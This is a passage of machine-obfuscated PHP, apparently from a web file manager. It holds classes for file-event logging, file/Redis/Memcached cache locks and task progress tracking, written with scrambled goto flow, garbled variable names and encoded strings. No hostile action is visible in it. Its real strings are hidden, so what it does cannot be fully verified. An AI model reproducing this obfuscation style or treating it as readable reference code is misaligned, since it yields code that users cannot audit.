$Aèâˆ£îŠÑ[1868] => $cÑÆêä³ğ); goto D¢ßÒ®‰; C‡‚‚İìœ±: foreach ($E»Ğ‰ÓœÜª as $c•—´ŞƒŒë) { if ($c•—´ŞƒŒë[$Aèâˆ£îŠÑ[389]] == SourceModel::TYPE_USER) { $c»Ìùãäµœ[] = intval($c•—´ŞƒŒë[$Aèâˆ£îŠÑ[474]]); } else { if ($c•—´ŞƒŒë[$Aèâˆ£îŠÑ[389]] == SourceModel::TYPE_GROUP) { $cÑÆêä³ğ[] = intval($c•—´ŞƒŒë[$Aèâˆ£îŠÑ[474]]); } } } if ($c»Ìùãäµœ) { $c»Ìùãäµœ = Model($Aèâˆ£îŠÑ[492])->userListInfo($c»Ìùãäµœ); } if ($cÑÆêä³ğ) { $dáÎåîîœŒ = array($Aèâˆ£îŠÑ[1744] => array($Aèâˆ£îŠÑ[402], $cÑÆêä³ğ)); $cÑÆêä³ğ = Model($Aèâˆ£îŠÑ[476])->field($Aèâˆ£îŠÑ[1757])->where($dáÎåîîœŒ)->select(); $cÑÆêä³ğ = array_to_keyvalue($cÑÆêä³ğ, $Aèâˆ£îŠÑ[1663]); } goto EÔó†¡ñİù; f„”õ÷Ü„İ: $Aèâˆ£îŠÑ =& $_SERVER[òÀöí]; $c»Ìùãäµœ = array(); $cÑÆêä³ğ = array(); goto C‡‚‚İìœ±; D¢ßÒ®‰: } public function authInfo($c¨ô«ÂêÅ) { $AÕ´œ¬™ÎÆ =& $_SERVER[òÀöí]; if ($c¨ô«ÂêÅ[$AÕ´œ¬™ÎÆ[1812]]) { $cõ’‘‹¦Šô = Model($AÕ´œ¬™ÎÆ[1831])->listData($c¨ô«ÂêÅ[$AÕ´œ¬™ÎÆ[1812]]); if (!$cõ’‘‹¦Šô) { return !1; $C•òİŸÁÎà = Model($AÕ´œ¬™ÎÆ[1831])->listData(); $aÌÀ„†Æ = array_filter_by_field($C•òİŸÁÎà, $AÕ´œ¬™ÎÆ[394], $AÕ´œ¬™ÎÆ[486]); return $aÌÀ„†Æ; } $FÌ”–ÒÆ = array_field_key($cõ’‘‹¦Šô, array($AÕ´œ¬™ÎÆ[385], $AÕ´œ¬™ÎÆ[28], $AÕ´œ¬™ÎÆ[394], $AÕ´œ¬™ÎÆ[1684], $AÕ´œ¬™ÎÆ[1686])); $FÌ”–ÒÆ[$AÕ´œ¬™ÎÆ[1869]] = $c¨ô«ÂêÅ; return $FÌ”–ÒÆ; } else { return array($AÕ´œ¬™ÎÆ[403] => 0, $AÕ´œ¬™ÎÆ[1669] => $c¨ô«ÂêÅ[$AÕ´œ¬™ÎÆ[1813]], $AÕ´œ¬™ÎÆ[404] => $AÕ´œ¬™ÎÆ[33], $AÕ´œ¬™ÎÆ[1684] => $AÕ´œ¬™ÎÆ[1870]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\162\143\145\x5f\x65\x76\145\x6e\x74"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\145\x54\x69\155\145", "\164\x69\155\x65", "\x69\x6e\163\x65\162\x74", "\x66\x75\156\143\164\151\x6f\156"), array("\x64\145\163\143", '', "\151\x6e\163\x65\162\164\x2c\x75\160\x64\141\x74\x65\54\x73\x65\x6c\145\143\x74", "\x6a\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($CöÅŒÅ×¬, $aÀö•ÜŸÊ, $E—Ï¹óğóì = '') { goto Eêøï‹‹êæ; Eêøï‹‹êæ: $aŸíØ†ö¾ =& $_SERVER[òÀöí]; if (!$this->eventSave) { return; } $FÜÔ¯Ú‚åÃ = Model($aŸíØ†ö¾[1181])->sourceInfo($CöÅŒÅ×¬); goto fİ£È©–Íø; fİ£È©–Íø: if (!$FÜÔ¯Ú‚åÃ) { return !1; } if ($this->isCacheEvent($FÜÔ¯Ú‚åÃ, $aÀö•ÜŸÊ)) { return; } if ($E—Ï¹óğóì && is_string($E—Ï¹óğóì)) { $E—Ï¹óğóì = array($aŸíØ†ö¾[1697] => $E—Ï¹óğóì); } goto EÓÉËçæ¸¿; EÓÉËçæ¸¿: $C¢™ä»ÛÒ» = array($aŸíØ†ö¾[401] => $CöÅŒÅ×¬, $aŸíØ†ö¾[1871] => $FÜÔ¯Ú‚åÃ[$aŸíØ†ö¾[479]], $aŸíØ†ö¾[1872] => $FÜÔ¯Ú‚åÃ[$aŸíØ†ö¾[28]], $aŸíØ†ö¾[484] => $FÜÔ¯Ú‚åÃ[$aŸíØ†ö¾[484]], $aŸíØ†ö¾[1496] => USER_ID, $aŸíØ†ö¾[406] => $aÀö•ÜŸÊ, $aŸíØ†ö¾[1498] => $E—Ï¹óğóì); $this->addSystemLog($aÀö•ÜŸÊ, $C¢™ä»ÛÒ»); return $this->add($C¢™ä»ÛÒ»); goto fàš‘§®„¢; fàš‘§®„¢: } private function addSystemLog($dµ™„ƒ¨Œê, $dÑ¥¼÷ †í) { $bø–‹ŠåÁ =& $_SERVER[òÀöí]; if ($dµ™„ƒ¨Œê == $bø–‹ŠåÁ[1873]) { $dµ™„ƒ¨Œê = $dÑ¥¼÷ †í[$bø–‹ŠåÁ[422]][$bø–‹ŠåÁ[1874]]; } else { if (in_array($dµ™„ƒ¨Œê, array($bø–‹ŠåÁ[1640], $bø–‹ŠåÁ[1875]))) { $dµ™„ƒ¨Œê = $dÑ¥¼÷ †í[$bø–‹ŠåÁ[422]][$bø–‹ŠåÁ[711]]; } } $eˆ´»†Óòˆ = array_merge($dÑ¥¼÷ †í, array($bø–‹ŠåÁ[1876] => $dÑ¥¼÷ †í[$bø–‹ŠåÁ[387]], $bø–‹ŠåÁ[1877] => $dÑ¥¼÷ †í[$bø–‹ŠåÁ[1877]])); Model($bø–‹ŠåÁ[1603])->addLog($bø–‹ŠåÁ[1878] . $dµ™„ƒ¨Œê, $eˆ´»†Óòˆ); } private function isCacheEvent($fâ›ÁŸ„µ†, $D´Ã‡Ñùè×) { if ($fâ›ÁŸ„µ†[$_SERVER[òÀöí][389]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($CÌÒÄ¬”Š, $fÖï²¿–¡) { $b†ÀĞ‹»… =& $_SERVER[òÀöí]; $E‰‰à¼‚ = Model($b†ÀĞ‹»…[1181])->sourceInfo($CÌÒÄ¬”Š); $FéÁÀ±†ó = array($b†ÀĞ‹»…[1874] => $fÖï²¿–¡, $b†ÀĞ‹»…[28] => $E‰‰à¼‚[$b†ÀĞ‹»…[28]]); return $this->addEvent($CÌÒÄ¬”Š, $b†ÀĞ‹»…[1873], $FéÁÀ±†ó); } public function eventFileEdit($F ÖÇšï—Ö) { $cÒ”…‘¤Œâ =& $_SERVER[òÀöí]; $bÏäŒÀ£ä = array($cÒ”…‘¤Œâ[1879] => $_SERVER[$cÒ”…‘¤Œâ[1880]], $cÒ”…‘¤Œâ[1881] => strtolower(ACTION)); return $this->addEvent($F ÖÇšï—Ö, $cÒ”…‘¤Œâ[1630], $bÏäŒÀ£ä); } public function eventRecycle($Eé†²´¸××, $fÃÏš±ª) { return $this->addEvent($Eé†²´¸××, $_SERVER[òÀöí][1875], $fÃÏš±ª); } public function eventRemove($Fæ‡Ø¬¯ã) { $C“Ñ‘Ù =& $_SERVER[òÀöí]; $CÈŒÊä£“‡ = Model($C“Ñ‘Ù[1181])->sourceInfo($Fæ‡Ø¬¯ã); $bé“°ŸËˆæ = $CÈŒÊä£“‡[$C“Ñ‘Ù[28]]; return $this->addEvent($CÈŒÊä£“‡[$C“Ñ‘Ù[479]], $C“Ñ‘Ù[1629], $bé“°ŸËˆæ); } public function eventShare($e…Ì†ó¹Üœ, $F½šïšó•â) { return $this->addEvent($e…Ì†ó¹Üœ, $_SERVER[òÀöí][1640], $F½šïšó•â); } public function eventMove($A‰èâ‚–çñ, $cÂÕµƒ‰«Õ, $aé´§Ÿ¦’Œ) { goto e¨ØÈä×»î; bËæç‹¯£—: $a“ºÑÎ¯Ñ = $AíÒéÆ¶¼->sourceInfo($cÂÕµƒ‰«Õ); $Fä•Œİ•‹² = $AíÒéÆ¶¼->sourceInfo($aé´§Ÿ¦’Œ); $dÄ×Œ‡…§ = array($a©Ğ™İ‹Û´[1033] => $cÂÕµƒ‰«Õ, $a©Ğ™İ‹Û´[1882] => $a“ºÑÎ¯Ñ[$a©Ğ™İ‹Û´[28]], $a©Ğ™İ‹Û´[1863] => $a“ºÑÎ¯Ñ[$a©Ğ™İ‹Û´[484]], $a©Ğ™İ‹Û´[1034] => $aé´§Ÿ¦’Œ, $a©Ğ™İ‹Û´[1883] => $Fä•Œİ•‹²[$a©Ğ™İ‹Û´[28]], $a©Ğ™İ‹Û´[1884] => $Fä•Œİ•‹²[$a©Ğ™İ‹Û´[484]]); goto D¬Ï ÷õ ì; D¬Ï ÷õ ì: $this->addEvent($A‰èâ‚–çñ, $a©Ğ™İ‹Û´[509], $dÄ×Œ‡…§); $aÍ£ª¡È‘É = $AíÒéÆ¶¼->sourceInfo($A‰èâ‚–çñ); $dÄ×Œ‡…§ = array($a©Ğ™İ‹Û´[387] => $aÍ£ª¡È‘É[$a©Ğ™İ‹Û´[387]], $a©Ğ™İ‹Û´[28] => $aÍ£ª¡È‘É[$a©Ğ™İ‹Û´[28]]); goto F’»‹×Ü«; F’»‹×Ü«: $this->addEvent($cÂÕµƒ‰«Õ, $a©Ğ™İ‹Û´[1885], $dÄ×Œ‡…§); goto eÖ­Û°¾Ï»; e¨ØÈä×»î: $a©Ğ™İ‹Û´ =& $_SERVER[òÀöí]; $AíÒéÆ¶¼ = Model($a©Ğ™İ‹Û´[1181]); $aÍ£ª¡È‘É = $AíÒéÆ¶¼->sourceInfo($A‰èâ‚–çñ); goto bËæç‹¯£—; eÖ­Û°¾Ï»: } public function eventCopy($b¶š¹’Î‰) { $this->eventCreate($b¶š¹’Î‰, $_SERVER[òÀöí][507]); } public function eventRename($B‘´×ê’¬ã, $a“å¨¥»®í, $bÎ°ÀµÄ­) { $BƒšŒƒÂŒ‰ =& $_SERVER[òÀöí]; $CÚ¦ºÄõÎ³ = array($BƒšŒƒÂŒ‰[1033] => $a“å¨¥»®í, $BƒšŒƒÂŒ‰[1034] => $bÎ°ÀµÄ­); return $this->addEvent($B‘´×ê’¬ã, $BƒšŒƒÂŒ‰[1194], $CÚ¦ºÄõÎ³); } public function eventAddComment($e±æ„˜ÁÕÚ, $FæÜÆ•œ¶Ö) { return $this->addEvent($e±æ„˜ÁÕÚ, $_SERVER[òÀöí][1886], $FæÜÆ•œ¶Ö); } public function eventAddDesc($f×ß¨ò¾, $aƒ¿”ÂÉ·Ò) { return $this->addEvent($f×ß¨ò¾, $_SERVER[òÀöí][1887], $aƒ¿”ÂÉ·Ò); } public function listBySource($Dˆ»¨ÑğíÂ) { goto dßšĞï×Ô; dßšĞï×Ô: $e°ê’©µ¯ =& $_SERVER[òÀöí]; $DÜéƒÜŒÀ = Model($e°ê’©µ¯[1181])->sourceInfo($Dˆ»¨ÑğíÂ); $D‚‰ñÓŒ‹Ì = array($e°ê’©µ¯[401] => $Dˆ»¨ÑğíÂ); goto b­ÌŞ§ÎãŸ; b­ÌŞ§ÎãŸ: if ($DÜéƒÜŒÀ[$e°ê’©µ¯[388]] == $e°ê’©µ¯[86]) { $c­Æ£Š¹ = Model($e°ê’©µ¯[1181])->listSearchChildren($Dˆ»¨ÑğíÂ, 20000); $c­Æ£Š¹[] = $Dˆ»¨ÑğíÂ . $e°ê’©µ¯[370]; $D‚‰ñÓŒ‹Ì = array($e°ê’©µ¯[387] => array($e°ê’©µ¯[7], $c­Æ£Š¹)); } $dá„åôÆ²µ = $this->where($D‚‰ñÓŒ‹Ì)->order($e°ê’©µ¯[1888])->selectPage(); if ($dá„åôÆ²µ[$e°ê’©µ¯[360]][$e°ê’©µ¯[361]] == 0) { $dá„åôÆ²µ[$e°ê’©µ¯[360]][$e°ê’©µ¯[361]] = 1; $dá„åôÆ²µ[$e°ê’©µ¯[363]] = array(array($e°ê’©µ¯[401] => $Dˆ»¨ÑğíÂ, $e°ê’©µ¯[1871] => $DÜéƒÜŒÀ[$e°ê’©µ¯[479]], $e°ê’©µ¯[1496] => $DÜéƒÜŒÀ[$e°ê’©µ¯[396]], $e°ê’©µ¯[406] => $e°ê’©µ¯[1889], $e°ê’©µ¯[407] => $DÜéƒÜŒÀ[$e°ê’©µ¯[192]], $e°ê’©µ¯[1498] => $e°ê’©µ¯[33])); } goto A¬ïÈ¯´®; A¬ïÈ¯´®: return $this->eventListParse($dá„åôÆ²µ, $Dˆ»¨ÑğíÂ); goto b˜ìä³É¾; b˜ìä³É¾: } private function eventListParse($C„óÅòêÕ¸, $cö’ƒø˜»Š) { goto aÔÉáë£½; aôõ“²í„ã: $eß„¨Ë·ØÕ = array_to_keyvalue($cø¡ù¥Ÿ‰, $eÊó‚¡Ã‹÷[33], $eÊó‚¡Ã‹÷[1877]); foreach ($cø¡ù¥Ÿ‰ as $bğÓƒ–Ï×†) { $f×Ãæ·¦Ş’ = $bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[422]]; if ($bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[29]] == $eÊó‚¡Ã‹÷[509] && isset($f×Ãæ·¦Ş’[$eÊó‚¡Ã‹÷[1033]])) { $aˆôÛí©š[] = $f×Ãæ·¦Ş’[$eÊó‚¡Ã‹÷[1033]] . $eÊó‚¡Ã‹÷[33]; $aˆôÛí©š[] = $f×Ãæ·¦Ş’[$eÊó‚¡Ã‹÷[1034]] . $eÊó‚¡Ã‹÷[33]; } if ($bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[29]] == $eÊó‚¡Ã‹÷[1885] && isset($f×Ãæ·¦Ş’[$eÊó‚¡Ã‹÷[387]])) { $aˆôÛí©š[] = $f×Ãæ·¦Ş’[$eÊó‚¡Ã‹÷[387]] . $eÊó‚¡Ã‹÷[33]; } } $aˆôÛí©š = array_merge($aˆôÛí©š, $eß„¨Ë·ØÕ, array($cö’ƒø˜»Š . $eÊó‚¡Ã‹÷[33])); goto Eî…«Ù¿š¨; aÔÉáë£½: $eÊó‚¡Ã‹÷ =& $_SERVER[òÀöí]; $cø¡ù¥Ÿ‰ = $C„óÅòêÕ¸[$eÊó‚¡Ã‹÷[363]]; $aˆôÛí©š = array_to_keyvalue($cø¡ù¥Ÿ‰, $eÊó‚¡Ã‹÷[33], $eÊó‚¡Ã‹÷[387]); goto aôõ“²í„ã; AÂîŒãÔóï: $C„óÅòêÕ¸[$eÊó‚¡Ã‹÷[363]] = $cø¡ù¥Ÿ‰; return $C„óÅòêÕ¸; goto F–”¾–î¥¤; a§ÍÉ¦³„ô: $bÍš›ŸôÒÎ = Model($eÊó‚¡Ã‹÷[778])->sourceListInfo($aˆôÛí©š, !0); foreach ($cø¡ù¥Ÿ‰ as &$bğÓƒ–Ï×†) { if ($bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[29]] == $eÊó‚¡Ã‹÷[509] && isset($bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[422]][$eÊó‚¡Ã‹÷[1033]])) { $bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[422]][$eÊó‚¡Ã‹÷[1033]] = $bÍš›ŸôÒÎ[$bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[422]][$eÊó‚¡Ã‹÷[1033]]]; $bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[422]][$eÊó‚¡Ã‹÷[1034]] = $bÍš›ŸôÒÎ[$bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[422]][$eÊó‚¡Ã‹÷[1034]]]; } if ($bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[29]] == $eÊó‚¡Ã‹÷[1885] && isset($bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[422]][$eÊó‚¡Ã‹÷[387]])) { $bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[422]][$eÊó‚¡Ã‹÷[387]] = $bÍš›ŸôÒÎ[$bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[422]][$eÊó‚¡Ã‹÷[387]]]; } $bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[84]] = $bÍš›ŸôÒÎ[$bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[387]]]; $bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[1890]] = $bÍš›ŸôÒÎ[$bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[1877]]]; if ($bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[29]] == $eÊó‚¡Ã‹÷[1629]) { $bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[1890]] = $bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[84]]; $bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[1877]] = $bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[1890]][$eÊó‚¡Ã‹÷[387]]; $bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[84]] = !1; $bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[387]] = $eÊó‚¡Ã‹÷[33]; } $bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[1821]] = $C¾»Íô¥ëÄ[$bğÓƒ–Ï×†[$eÊó‚¡Ã‹÷[1504]]]; } unset($bğÓƒ–Ï×†); goto AÂîŒãÔóï; Eî…«Ù¿š¨: $aˆôÛí©š = array_unique($aˆôÛí©š); $DÒ–ùæää± = array_unique(array_to_keyvalue($cø¡ù¥Ÿ‰, $eÊó‚¡Ã‹÷[33], $eÊó‚¡Ã‹÷[1504])); $C¾»Íô¥ëÄ = Model($eÊó‚¡Ã‹÷[495])->userListInfo($DÒ–ùæää±); goto a§ÍÉ¦³„ô; F–”¾–î¥¤: } public function removeBySource($bä¢Á–ô›£) { $d³·´í¹¶ = array($_SERVER[òÀöí][401] => $bä¢Á–ô›£); $this->where($d³·´í¹¶)->remove(); } } goto bÇ´ï¦š­§; EÇ©ù÷•ñÜ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $d¶Ø²£ó…ñ =& $_SERVER[òÀöí]; $EñÃÜ©ïµ† = $GLOBALS[$d¶Ø²£ó…ñ[6]][$d¶Ø²£ó…ñ[345]]; self::$cachePath = $EñÃÜ©ïµ†[$d¶Ø²£ó…ñ[173]][$d¶Ø²£ó…ñ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($c¿á£Şèï¤, $aèöµÓĞœ­ = 0) { goto fàÍÆ—…Ÿñ; F‡’§–™“»: $this->unlock($c¿á£Şèï¤); return !1; goto B³…ŠùÓŠ¸; fàÍÆ—…Ÿñ: $D›öÃ…‹Ì =& $_SERVER[òÀöí]; $DŠÁ¼ò½à¤ = microtime(!0); $c¾ÁÄ«îÅ£ = $DŠÁ¼ò½à¤ + $aèöµÓĞœ­ + 0.0001; goto b—´¹Ğ÷Øù; b—´¹Ğ÷Øù: $e™âéŞ›¼š = rtrim(self::$cachePath, $D›öÃ…‹Ì[8]) . $D›öÃ…‹Ì[806] . md5($c¿á£Şèï¤) . $D›öÃ…‹Ì[803]; if (file_exists($e™âéŞ›¼š) && filemtime($e™âéŞ›¼š) && filemtime($e™âéŞ›¼š) < time() - 10) { @unlink($e™âéŞ›¼š); } do { if (file_exists($e™âéŞ›¼š)) { cacheLockWait(); continue; } $f°õë’ƒŒ = fopen($e™âéŞ›¼š, $D›öÃ…‹Ì[807]); if (!$f°õë’ƒŒ) { return !1; } $bœ°§­¸‹¯ = flock($f°õë’ƒŒ, LOCK_EX | LOCK_NB); self::$caches[$c¿á£Şèï¤] = array($D›öÃ…‹Ì[808] => $f°õë’ƒŒ, $D›öÃ…‹Ì[173] => $e™âéŞ›¼š); fwrite($f°õë’ƒŒ, $c¾ÁÄ«îÅ£); clearstatcache(); if ($f°õë’ƒŒ && $bœ°§­¸‹¯) { return !0; } cacheLockWait(); } while (microtime(!0) < $c¾ÁÄ«îÅ£); goto F‡’§–™“»; B³…ŠùÓŠ¸: } public function lockGet($EèÏÌå­¢“) { $cã·–çÎçÅ =& $_SERVER[òÀöí]; $eĞÓÚÚ—²± = rtrim(self::$cachePath, $cã·–çÎçÅ[8]) . $cã·–çÎçÅ[806] . md5($EèÏÌå­¢“) . $cã·–çÎçÅ[803]; return file_exists($eĞÓÚÚ—²±); } public function unlock($fÊğ´Ïá¯) { goto bé“šÏá£é; bé“šÏá£é: $d†…ìŠ®¹Ü =& $_SERVER[òÀöí]; $e©­Ô½‡á¯ = self::$caches[$fÊğ´Ïá¯]; if (!$e©­Ô½‡á¯) { return; } goto dœòô­ÌØÑ; dœòô­ÌØÑ: @flock($e©­Ô½‡á¯[$d†…ìŠ®¹Ü[808]], LOCK_UN); @fclose($e©­Ô½‡á¯[$d†…ìŠ®¹Ü[808]]); @unlink($e©­Ô½‡á¯[$d†…ìŠ®¹Ü[173]]); goto fòŞ¬¶½ˆ; fòŞ¬¶½ˆ: unset(self::$caches[$fÊğ´Ïá¯]); goto bÆ¾Á¿†Ìø; bÆ¾Á¿†Ìø: } } class CacheLockRedis { public function lock($aÓï—ŠÌ¨Ì, $a±õµåãØê = 10) { $f­ëĞ…ã­ = Cache::init(); $Bã£Àµ’Ÿ = microtime(!0) + $a±õµåãØê; while (microtime(!0) < $Bã£Àµ’Ÿ) { $cÜ³‹¾í“Ò = $f­ëĞ…ã­->get($aÓï—ŠÌ¨Ì); if (!$cÜ³‹¾í“Ò) { $d†Â¼Š²îÚ = $f­ëĞ…ã­->setLock($aÓï—ŠÌ¨Ì, $Bã£Àµ’Ÿ, $a±õµåãØê); if ($d†Â¼Š²îÚ) { return !0; } } else { if ($cÜ³‹¾í“Ò < microtime(!0)) { $f­ëĞ…ã­->set($aÓï—ŠÌ¨Ì, $Bã£Àµ’Ÿ, $Bã£Àµ’Ÿ); if ($f­ëĞ…ã­->get($aÓï—ŠÌ¨Ì) === $cÜ³‹¾í“Ò) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($E–Óõ×•ƒ–) { return Cache::init()->get($E–Óõ×•ƒ–); } public function unlock($bÀİì‘ñŸˆ) { return Cache::init()->remove($bÀİì‘ñŸˆ); } } class CacheLockMemcached { public function lock($DàÑî¾Ë÷¡, $b´Èçé¶”‚ = 0) { $b¼‡®®Ü¤À = Cache::init(); $aÉİˆ§Ì¯è = microtime(!0) + $b´Èçé¶”‚; while (microtime(!0) < $aÉİˆ§Ì¯è) { $a½Èø£øĞÇ = $b¼‡®®Ü¤À->get($DàÑî¾Ë÷¡); if (!$a½Èø£øĞÇ || $a½Èø£øĞÇ < microtime(!0)) { $AâÃß²„‹Ô = $b¼‡®®Ü¤À->handle->add($DàÑî¾Ë÷¡, $aÉİˆ§Ì¯è, $b´Èçé¶”‚); if ($AâÃß²„‹Ô) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($e¼ÕÛ²ãÀÂ) { return Cache::init()->get($e¼ÕÛ²ãÀÂ); } public function unlock($døÇ½ñšâ) { return Cache::init()->remove($døÇ½ñšâ); } } goto d¡Ú‹‡¥Õ¾; F©‰‚ÇÊîÄ: class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\x72\165\x6e\156\x69\156\x67"; const STATYS_KILL = "\153\151\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($dÇ‘ß“°¯, $Eó†ÆÔ¢ùÂ = '', $aÖ‰ªæÈºç = 0, $a²ÄÔšğÎ = '') { goto Dğï©ğö”£; E‹‹ø„¨Ö: $this->startAfter(); Hook::trigger($FÕøÅ«ëß¨[1516], $this->task); $this->task[$FÕøÅ«ëß¨[1509]] = timeFloat(); goto d¬Æ˜½Üì•; Dğï©ğö”£: $FÕøÅ«ëß¨ =& $_SERVER[òÀöí]; if (self::get($dÇ‘ß“°¯)) { return; } $this->task = array($FÕøÅ«ëß¨[385] => $dÇ‘ß“°¯, $FÕøÅ«ëß¨[1504] => USER_ID, $FÕøÅ«ëß¨[1409] => $a²ÄÔšğÎ, $FÕøÅ«ëß¨[29] => $Eó†ÆÔ¢ùÂ, $FÕøÅ«ëß¨[1002] => $FÕøÅ«ëß¨[33], $FÕøÅ«ëß¨[1000] => $aÖ‰ªæÈºç, $FÕøÅ«ëß¨[1014] => 0, $FÕøÅ«ëß¨[1505] => 0, $FÕøÅ«ëß¨[1506] => 0, $FÕøÅ«ëß¨[1507] => timeFloat(), $FÕøÅ«ëß¨[1508] => 0, $FÕøÅ«ëß¨[1509] => 0, $FÕøÅ«ëß¨[1510] => 0, $FÕøÅ«ëß¨[1511] => 0, $FÕøÅ«ëß¨[708] => $FÕøÅ«ëß¨[1467]); goto A³ÁÁÕôÈ‘; A³ÁÁÕôÈ‘: $GLOBALS[$FÕøÅ«ëß¨[1512]] = 1; Hook::bind($FÕøÅ«ëß¨[1469], array($this, $FÕøÅ«ëß¨[1513])); Hook::bind($FÕøÅ«ëß¨[1514], array($this, $FÕøÅ«ëß¨[1515])); goto E‹‹ø„¨Ö; d¬Æ˜½Üì•: } public function end() { goto F¾“ç°‡”; a¨à²”¸Ì¢: $c„Èßô¸çæ = timeFloat() - $this->task[$aêÜÀÜŒ[1507]]; self::log($aêÜÀÜŒ[1517] . $this->task[$aêÜÀÜŒ[385]] . $aêÜÀÜŒ[1518] . $c„Èßô¸çæ . $aêÜÀÜŒ[1519]); Hook::unbind($aêÜÀÜŒ[1469], array($this, $aêÜÀÜŒ[1513])); goto c÷Ä“ğß„; F¾“ç°‡”: $aêÜÀÜŒ =& $_SERVER[òÀöí]; if (!$this->task) { return; } if ($this->task[$aêÜÀÜŒ[1509]]) { self::valueSet($this->task[$aêÜÀÜŒ[385]], !1); } goto a¨à²”¸Ì¢; c÷Ä“ğß„: Hook::unbind($aêÜÀÜŒ[1514], array($this, $aêÜÀÜŒ[1515])); $this->endAfter(); $this->task = !1; goto ešÉíç¦Ó; ešÉíç¦Ó: } public function update($D²Å“Úµ¢± = 0, $aº’ŞÀËì = false) { goto DÖˆôÃÅ¬Æ; cÅ»‹‡ò¯Â: $eá¯íâã•„[$EÆƒÓìêĞ‰[708]] = $Eê‚É¢„¥¤ ? $Eê‚É¢„¥¤ : $eá¯íâã•„[$EÆƒÓìêĞ‰[708]]; $eá¯íâã•„[$EÆƒÓìêĞ‰[1510]] = $e¶¥¢Øİ“©[$EÆƒÓìêĞ‰[1510]] ? $e¶¥¢Øİ“©[$EÆƒÓìêĞ‰[1510]] : 0; $eá¯íâã•„[$EÆƒÓìêĞ‰[1509]] = timeFloat(); goto a„„Ğî¡£à; Bß¥Ä”ÉÛ‰: $this->updateAfter(); $c¦ÂĞ¯‚ï = 0.2; if (timeFloat() - $eá¯íâã•„[$EÆƒÓìêĞ‰[1509]] < $c¦ÂĞ¯‚ï && !$aº’ŞÀËì) { return; } goto Eî‡ĞÚĞ‚; Eî‡ĞÚĞ‚: $e¶¥¢Øİ“© = self::get($eá¯íâã•„[$EÆƒÓìêĞ‰[385]]); $Eê‚É¢„¥¤ = $e¶¥¢Øİ“©[$EÆƒÓìêĞ‰[708]]; if ($Eê‚É¢„¥¤ == self::STATYS_KILL) { $AƒÆâÀ‡À¼ = array($EÆƒÓìêĞ‰[1520] => LNG($EÆƒÓìêĞ‰[1521]), $EÆƒÓìêĞ‰[1064] => !1); Cache::set($EÆƒÓìêĞ‰[1522] . $this->task[$EÆƒÓìêĞ‰[385]], $AƒÆâÀ‡À¼, 30); $this->end(); die; } else { if ($Eê‚É¢„¥¤ == self::STATYS_STOP) { $F©÷¡â–áƒ = 2; $e¶¥¢Øİ“©[$EÆƒÓìêĞ‰[1510]] += $F©÷¡â–áƒ; self::valueSet($eá¯íâã•„[$EÆƒÓìêĞ‰[385]], $e¶¥¢Øİ“©); sleep($F©÷¡â–áƒ); $this->update(); return; } } goto cÅ»‹‡ò¯Â; Aë¼…ª‘Í¾: $eá¯íâã•„[$EÆƒÓìêĞ‰[1014]] += $D²Å“Úµ¢±; $eá¯íâã•„[$EÆƒÓìêĞ‰[1508]] = timeFloat(); if ($eá¯íâã•„[$EÆƒÓìêĞ‰[1000]]) { if ($eá¯íâã•„[$EÆƒÓìêĞ‰[1000]] < $eá¯íâã•„[$EÆƒÓìêĞ‰[1014]]) { $eá¯íâã•„[$EÆƒÓìêĞ‰[1000]] = $eá¯íâã•„[$EÆƒÓìêĞ‰[1014]]; } $aÔŠç·¡ = timeFloat() - $eá¯íâã•„[$EÆƒÓìêĞ‰[1507]] - $eá¯íâã•„[$EÆƒÓìêĞ‰[1510]]; $eá¯íâã•„[$EÆƒÓìêĞ‰[1505]] = $eá¯íâã•„[$EÆƒÓìêĞ‰[1014]] / $eá¯íâã•„[$EÆƒÓìêĞ‰[1000]]; $eá¯íâã•„[$EÆƒÓìêĞ‰[1506]] = $eá¯íâã•„[$EÆƒÓìêĞ‰[1014]] / $aÔŠç·¡; if ($eá¯íâã•„[$EÆƒÓìêĞ‰[1505]] > 0) { $eá¯íâã•„[$EÆƒÓìêĞ‰[1511]] = $aÔŠç·¡ * (1 - $eá¯íâã•„[$EÆƒÓìêĞ‰[1505]]) / $eá¯íâã•„[$EÆƒÓìêĞ‰[1505]]; } $eá¯íâã•„[$EÆƒÓìêĞ‰[1511]] = $eá¯íâã•„[$EÆƒÓìêĞ‰[1511]] <= 0 ? 0 : $eá¯íâã•„[$EÆƒÓìêĞ‰[1511]]; } goto Bß¥Ä”ÉÛ‰; DÖˆôÃÅ¬Æ: $EÆƒÓìêĞ‰ =& $_SERVER[òÀöí]; $eá¯íâã•„ =& $this->task; if (!$eá¯íâã•„) { return; } goto Aë¼…ª‘Í¾; a„„Ğî¡£à: 